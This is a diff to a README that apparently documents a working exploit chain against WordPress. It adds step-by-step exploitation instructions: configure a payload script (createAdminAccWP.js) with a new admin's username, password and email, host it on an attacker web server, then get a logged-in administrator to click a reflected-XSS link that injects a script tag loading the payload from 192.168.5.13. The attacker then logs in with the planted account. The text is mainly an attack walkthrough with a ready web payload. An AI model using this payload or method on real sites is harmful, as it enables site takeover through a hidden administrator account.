@@ -10,16 +10,38 @@
 
 ## Exploitation Steps
 
-1. victim user (with administrative privileges) logs in
+1. [setup exploit] change payload variable values (`createAdminAccWP.js`)
 
-http://192.168.5.10/wp-login.php
+    `newAccUser` - username of the user account to be created
 
-2. victim user clicks link
+    `newAccPass` - password of the user account to be created (**NOTE**: minimum password length is 9 characters)
 
-```
-http://192.168.5.10/test/rxss.php?q=<script src=http://192.168.5.13/createAdminAccWP.js></script>
-```
+    `newAccEmail` - email of the user account to be created
+
+    `wpRoot` - path to WordPress installation on the target system (e.g. `"/path"`)
+
+2. [setup exploit] setup web server (to serve the payload)
+
+3. [social engineering attack] victim user (with administrative privileges) logs in
+
+    http://192.168.5.10/wp-login.php
+
+4. [social engineering attack] victim user clicks link
+
+    ```
+    http://192.168.5.10/test/rxss.php?q=<script src=http://192.168.5.13/createAdminAccWP.js></script>
+    ```
+
+    * **NOTES**:
+      * `192.168.5.10` - target WordPress site
+      * `192.168.5.13` - web server hosting payload
+
+5. [post exploit] attacker logs into target WordPress site using specified credentials
+
+    http://192.168.5.10/wp-login.php
 
 ## Screenshots
+
+* **NOTE**: the screenshot covers steps 1 to 4 from the "Exploitation Steps" chapter
 
 ![Image](screenshots/WordPress_-_create_new_admin_-_1-1.png)
